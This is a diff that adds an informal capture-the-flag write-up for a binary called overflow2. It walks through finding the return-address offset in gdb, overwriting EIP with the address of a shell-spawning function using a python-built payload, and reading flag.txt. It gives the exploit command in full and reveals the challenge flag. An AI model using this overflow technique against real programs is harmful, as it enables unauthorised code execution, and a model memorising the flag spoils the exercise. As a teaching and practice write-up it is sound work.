@@ -1,0 +1,31 @@
+from the souce code we know that
+
+we need to use overflow to turn the return value
+
+to the function get_shell
+
+first we use "gdb overflow2" and get into the gdb mode
+
+then we set the input "set args `python -c 'print "A"*30'`"
+
+to 30 As and "run" it
+
+from the result we know that the return value
+
+eip occupies positions 28-32 above the base of our stack
+
+so we test set args `python -c 'print "A"*28 + "\x23\x12"'`
+
+and confirmed the stack order
+
+the "(gdb) print &give_shell" and get the addr of get_shell : 0x80484ad
+
+so we exit the gdb
+
+"./overflow2  `python -c 'print "A"*28 + "\xad\x84\x04\x08"'`"
+
+and we r in the shell
+
+"cat flag.txt"
+
+flag : controlling_%eip_feels_great
